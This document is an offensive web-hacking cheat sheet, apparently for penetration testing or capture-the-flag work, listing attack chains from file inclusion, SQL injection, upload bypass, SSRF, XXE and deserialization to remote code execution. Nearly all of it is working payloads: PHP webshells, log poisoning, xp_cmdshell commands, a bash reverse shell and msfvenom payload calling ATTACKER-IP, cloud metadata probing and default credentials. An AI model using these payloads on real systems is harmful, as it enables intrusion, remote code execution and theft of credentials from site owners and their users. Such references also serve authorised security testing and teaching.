# Web Attack Chains

## LFI → Log Poisoning → RCE
```bash
# 1. Confirm LFI:
curl http://TARGET/page.php?file=../../../etc/passwd
# 2. Poison Apache/Nginx log:
curl http://TARGET/ -A "<?php system(\$_GET['cmd']); ?>"
# 3. Include the log:
curl "http://TARGET/page.php?file=../../../var/log/apache2/access.log&cmd=id"
# Common log paths:
# /var/log/apache2/access.log
# /var/log/nginx/access.log
# /var/log/httpd/access_log
```

## LFI → PHP Wrappers → Source Code → Creds
```bash
# Read source code as base64:
curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=config.php"
echo 'BASE64_OUTPUT' | base64 -d
# Look for DB creds, API keys, hardcoded passwords
# data:// wrapper for RCE (allow_url_include=On):
curl "http://TARGET/page.php?file=data://text/plain,<?php+system('id');?>"
```

## SQLi → File Read/Write → Webshell
```bash
# Read files:
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
# Write webshell (MySQL):
' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/shell.php'-- -
# Access webshell:
curl "http://TARGET/shell.php?cmd=id"
```

## SQLi → Stacked Queries → xp_cmdshell (MSSQL)
```bash
# Enable xp_cmdshell:
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
# Execute commands:
'; EXEC xp_cmdshell 'whoami';-- -
'; EXEC xp_cmdshell 'powershell -e BASE64_PAYLOAD';-- -
```

## File Upload Bypass → Webshell → Reverse Shell
```bash
# Bypass techniques:
# 1. Double extension: shell.php.jpg
# 2. Null byte (old PHP): shell.php%00.jpg
# 3. Content-Type: Change to image/jpeg
# 4. Magic bytes: Add GIF89a; before <?php
# 5. .phtml, .phar, .phps, .php5
# 6. Case: .pHp, .PHP
# Webshell → reverse shell:
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/443 0>&1'"); ?>
```

## WordPress → wpscan → Plugin Exploit or Theme Editor RCE
```bash
wpscan --url http://TARGET --enumerate u,ap,at --api-token TOKEN
# With admin creds → Appearance → Theme Editor → 404.php:
# Add: <?php system($_GET['cmd']); ?>
# Trigger: curl http://TARGET/wp-content/themes/THEME/404.php?cmd=id
# Or upload malicious plugin:
msfvenom -p php/reverse_php LHOST=ATTACKER-IP LPORT=443 -o shell.php
# Zip as plugin, upload via Plugins → Add New
```

## SSRF → Internal Service Access → Pivot
```bash
# Test for SSRF:
curl "http://TARGET/fetch?url=http://ATTACKER-IP/"
# Scan internal hosts:
curl "http://TARGET/fetch?url=http://127.0.0.1:8080"
curl "http://TARGET/fetch?url=http://192.168.1.1:445"
# Cloud metadata (AWS):
curl "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
```

## XXE → File Read → Creds
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- PHP wrapper for base64: -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

## Deserialization → RCE
```bash
# Java (ysoserial):
java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,BASE64}|{base64,-d}|{bash,-i}' > payload.bin
# PHP: Look for unserialize() with user input
# .NET: Use ysoserial.net with appropriate gadget chain
```

## CMS Default Creds → Admin Panel → Shell
```
# Common defaults:
# WordPress: admin/admin, admin/password
# Tomcat: tomcat/tomcat, admin/admin, tomcat/s3cret
# Jenkins: admin/admin (or no auth)
# Joomla: admin/admin
# After login → find code execution (file upload, plugin, template editor)
```

## API Endpoint Discovery → Auth Bypass
```bash
# Directory brute force for API:
gobuster dir -u http://TARGET/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
feroxbuster -u http://TARGET -w /usr/share/wordlists/dirmedium.txt
# Test auth bypass:
# Remove auth header, change JWT, IDOR on /api/users/1 → /api/users/2
# Method switching: GET → POST → PUT
```
